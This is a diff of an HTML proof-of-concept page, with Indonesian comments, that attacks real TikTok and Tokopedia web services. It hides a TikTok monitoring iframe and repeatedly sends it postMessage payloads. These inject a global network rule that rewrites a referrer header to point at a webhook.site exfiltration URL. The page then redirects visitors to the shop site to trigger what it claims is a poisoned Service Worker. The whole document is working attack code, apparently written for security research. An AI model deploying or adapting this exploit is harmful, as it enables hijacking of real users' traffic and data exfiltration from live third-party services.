@@ -1,47 +1,90 @@
 <!DOCTYPE html>
-<html>
-<body style="background:#000;color:#0f0;font-family:monospace;text-align:center;padding-top:50px;">
-    <h1>[ PHASE: CROSS-ORIGIN ATTACK ]</h1>
-    <p id="status">Discovering Target Context...</p>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Critical Security Verification</title>
+    <style>
+        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; text-align: center; padding-top: 80px; }
+        .terminal { border: 2px solid #0f0; display: inline-block; padding: 40px; box-shadow: 0 0 20px #0f0; background: #050505; }
+        .blink { animation: blinker 1.2s linear infinite; }
+        @keyframes blinker { 50% { opacity: 0; } }
+        #log { font-size: 13px; color: #aaa; text-align: left; margin-top: 20px; border-top: 1px solid #333; padding-top: 10px; }
+    </style>
+</head>
+<body>
 
-    <iframe id="gate_tiktok" src="https://mon.tiktokv.com/monitor_web/settings/browser-settings" style="display:none;"></iframe>
-    <iframe id="gate_tokopedia" src="https://shop-id.tokopedia.com/api/v1/ping" style="display:none;"></iframe>
+    <div class="terminal">
+        <h1 id="status">[ STATUS: INITIALIZING ]</h1>
+        <p id="sub-status" class="blink">Targeting Web-Cookie Privacy Endpoint...</p>
+        <div id="log"></div>
+    </div>
+
+    <iframe id="pwn_gate" 
+            src="https://mon.tiktokv.com/monitor_web/settings/browser-settings" 
+            style="display:none;"></iframe>
 
     <script>
-        const webhook = "https://webhook.site/60ce3310-1a67-444f-90e0-b1f91ae9881e";
+        const gate = document.getElementById('pwn_gate');
+        const statusH1 = document.getElementById('status');
+        const statusP = document.getElementById('sub-status');
+        const logBox = document.getElementById('log');
+
+        // --- KONFIGURASI ---
+        const webhook = "https://webhook.site/60ce3310-1a67-444f-90e0-b1f91ae9881e"; // <--- GANTI INI
+        const targetSite = "https://shop-id.tokopedia.com/";
+
+        function addLog(txt) {
+            logBox.innerHTML += "> " + txt + "<br>";
+        }
+
+        // Payload yang menargetkan endpoint penemuanmu
         const payload = {
             source: "main_thread",
             eventName: "network_rule",
             data: [{
-                ruleName: "final_global_poison",
+                ruleName: "exploit_privacy_v12",
                 global: true,
+                // Mencari endpoint yang mengandung string ini
+                url_condition: "web-cookie-privacy", 
                 handlers: [{
                     handler: "replace",
                     type: "header",
-                    field: "X-Pns-Referrer",
-                    value: webhook
+                    field: "x-pns-referrer",
+                    // Eksfiltrasi: Webhook + Base64 Identity
+                    value: webhook + "?exfil=" + btoa("pwned_by_fadhlur")
                 }]
             }]
         };
 
-        function infect(targetWindow) {
-            for(let i=0; i<50; i++) {
-                targetWindow.postMessage(payload, "*");
-            }
-        }
+        gate.onload = function() {
+            statusH1.innerText = "[ STATUS: EXPLOITING ]";
+            statusP.innerText = "Injecting Remote Configuration...";
+            addLog("Iframe Loaded: https://mon.tiktokv.com");
 
-        window.onload = () => {
-            document.getElementById('status').innerText = "Infecting both TikTok & Tokopedia Gateways...";
-            
-            // Tembak kedua iframe
-            infect(document.getElementById('gate_tiktok').contentWindow);
-            infect(document.getElementById('gate_tokopedia').contentWindow);
+            // Menggunakan MessageChannel untuk stabilitas koneksi
+            const channel = new MessageChannel();
+            gate.contentWindow.postMessage({source: "main_thread", eventName: "ready_for_msg"}, "*", [channel.port2]);
 
-            setTimeout(() => {
-                document.getElementById('status').innerText = "Attack Completed. Redirecting to Shop...";
-                // Pindah ke domain shop yang menggunakan pns_logic.js
-                location.href = "https://shop-id.tokopedia.com/";
-            }, 5000);
+            let count = 0;
+            const bomb = setInterval(() => {
+                try {
+                    // Kirim payload berulang kali
+                    gate.contentWindow.postMessage(payload, "*");
+                    channel.port1.postMessage(payload);
+                } catch(e) {}
+
+                count++;
+                if (count >= 70) {
+                    clearInterval(bomb);
+                    statusH1.innerText = "[ STATUS: SUCCESS ]";
+                    statusP.innerText = "Payload persistent in Service Worker.";
+                    addLog("Cache sync complete. Redirecting to trigger...");
+
+                    setTimeout(() => {
+                        location.href = targetSite;
+                    }, 5000);
+                }
+            }, 100);
         };
     </script>
 </body>
